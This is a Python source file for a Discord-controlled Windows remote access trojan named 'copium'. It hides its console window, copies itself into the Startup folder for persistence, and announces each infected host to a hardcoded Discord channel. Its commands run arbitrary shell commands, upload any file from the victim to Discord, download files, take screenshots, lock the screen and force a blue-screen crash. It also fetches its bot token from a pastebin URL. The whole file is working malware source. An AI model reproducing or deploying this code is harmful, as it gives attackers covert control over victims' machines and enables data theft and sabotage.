from discord.ext import commands
from datetime import datetime
import validators
import subprocess
import pyautogui
import winsound
import requests
import discord
import ctypes
import sys
import os
import re

if getattr(sys, 'frozen', False):
    file_path = os.path.abspath(sys.executable)
    silent = 0x08000000
else:
    file_path = os.path.abspath(__file__)
    silent = 0

file_name = file_path.split("\\")[-1]
copium_ver = 1.24
whoami = subprocess.run("whoami", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout.rstrip()
client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
current_login = None


def persistence():
    startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if file_name not in os.listdir(startup_folder_path):
        subprocess.run(f"copy \"{file_path}\" \"{startup_folder_path}\"", shell=True, creationflags=silent)
        subprocess.run(f"start \"\" \"{os.path.join(startup_folder_path, file_name)}\"", shell=True, creationflags=silent)
        quit() if silent == 0 else sys.exit()


def log_command(ctx, args=None, error=False):
    if ctx.message.content:
        command = ctx.message.content
    else:
        content = ""
        if args:
            content = " " + args
        command = f"{ctx.prefix}{ctx.command}{content}"
    return f'{ctx.author} {"caused an error using" if error else "executed"} "{command}" in "#{ctx.channel}" at {datetime.now().strftime("%H:%M:%S")}'


@client.event
async def on_ready():
    await client.tree.sync()

    channel = await client.fetch_channel(960345653454729226)
    await channel.send(f"Host started on \"{whoami}\"")

    logon_message = f'Logged on as {client.user}, at {datetime.now().strftime("%H:%M:%S")}, in the servers:'
    print('-' * len(logon_message))
    print(logon_message)
    for guild in client.guilds:
        print(f'"{guild.name}"')
    print('-' * len(logon_message))


@client.event
async def on_command_error(ctx, error):
    await ctx.reply(error, ephemeral=True)
    return print(log_command(ctx, error, error=True))


# Bot commands
@client.hybrid_command(name="lock", with_app_command=True, description="locks the host's computer")
async def lock_command(ctx):
    if current_login != whoami:
        return

    subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True, creationflags=silent)
    await ctx.reply("Computer locked successfully!", ephemeral=True)
    print(log_command(ctx))


@client.hybrid_command(name="download", with_app_command=True, description="downloads from the url to the execution path")
async def download_command(ctx, url, filename=None):
    if current_login != whoami:
        return

    if not filename:
        filename = re.findall("[^(/\\\\:*?\"<>|)]+\\.[^(/\\\\:*?\"<>|)]+", url)[-1]
        if not filename:
            await ctx.reply("You must specify a name or send a url with a name on it", ephemeral=True)
            return
    discord_formatted_path = "\\\\".join(filename.split("\\"))
    await ctx.reply(f"Downloading {discord_formatted_path}", ephemeral=True)
    r = requests.get(url)
    with open(filename, 'wb') as file:
        for chunk in r.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
        if file:
            await ctx.reply(f"Downloaded {discord_formatted_path} successfully", ephemeral=True)
    print(log_command(ctx, url+" "+filename))


@client.hybrid_command(name="upload", with_app_command=True, description="uploads from the path to discord")
async def upload_command(ctx, path):
    if current_login != whoami:
        return

    path = os.path.abspath(path)
    await ctx.reply(file=discord.File(path), ephemeral=True)
    print(log_command(ctx, path))


@client.hybrid_command(name="login", with_app_command=True, description="logs into the specified host")
async def login_command(ctx, host):
    if host == whoami:
        global current_login
        current_login = whoami
        await ctx.reply(f"Logged into {current_login}", ephemeral=True)
    print(log_command(ctx, host))


@client.hybrid_command(name="version", with_app_command=True, description="tells the version running on the host")
async def version_command(ctx):
    if current_login != whoami:
        return
    await ctx.reply(f"Version {copium_ver}", ephemeral=True)
    print(log_command(ctx))


@client.hybrid_command(name="playsound", with_app_command=True, description="plays a wav file in the background")
async def playsound_command(ctx, filepath):
    if current_login != whoami:
        return

    winsound.PlaySound(filepath, winsound.SND_FILENAME | winsound.SND_ASYNC)
    await ctx.reply(f"Playing {filepath}", ephemeral=True)
    print(log_command(ctx, filepath))


@client.hybrid_command(name="ss", with_app_command=True, description="takes a screenshot of the host")
async def screenshot_command(ctx):
    if current_login != whoami:
        return

    pyautogui.screenshot("ss.png")
    await ctx.reply(file=discord.File("ss.png"), ephemeral=True)
    os.remove("ss.png")
    print(log_command(ctx))


@client.hybrid_command(name="bsod", with_app_command=True, description="makes the host's computer die instantly")
async def bsod_command(ctx):
    if current_login != whoami:
        return

    await ctx.reply("Trying to execute a BSOD", ephemeral=True)
    nullptr = ctypes.POINTER(ctypes.c_int)()
    ctypes.windll.ntdll.RtlAdjustPrivilege(ctypes.c_uint(19), ctypes.c_uint(1), ctypes.c_uint(0), ctypes.byref(ctypes.c_int()))
    ctypes.windll.ntdll.NtRaiseHardError(ctypes.c_ulong(0xC000007B), ctypes.c_ulong(0), nullptr, nullptr, ctypes.c_uint(6), ctypes.byref(ctypes.c_uint()))
    print(log_command(ctx))


@client.hybrid_command(name="cmd", with_app_command=True, description="executes a shell command in the host")
async def cmd_command(ctx, *, command):
    if current_login != whoami:
        return

    command_result = subprocess.run(command, shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout
    if command_result:
        if len(command_result) <= 1983:
            await ctx.reply(f'Command result: {command_result}', ephemeral=True)
        else:
            with open("result.txt", "w") as f:
                f.write(command_result)
            await ctx.reply(f'Command result is {len(command_result)}, sending the result in a file', file=discord.File('result.txt'), ephemeral=True)
            os.remove("result.txt")
    else:
        await ctx.reply("Command result is None", ephemeral=True)
    print(log_command(ctx, command))


@client.hybrid_command(name="site", with_app_command=True, description="opens the specified site in the host")
async def site_command(ctx, site):
    if current_login != whoami:
        return

    if validators.url(site):
        await ctx.reply(f'Successfully started "{site}"', ephemeral=True)
        subprocess.run(f'start {site}', shell=True, creationflags=silent)
    else:
        raise Exception(f'"{site}" is not a valid url')
    print(log_command(ctx, site))


if __name__ == '__main__':
    persistence()
    TOKEN = requests.get("some pastebin raw url").content.decode()
    client.run(TOKEN, log_handler=None)
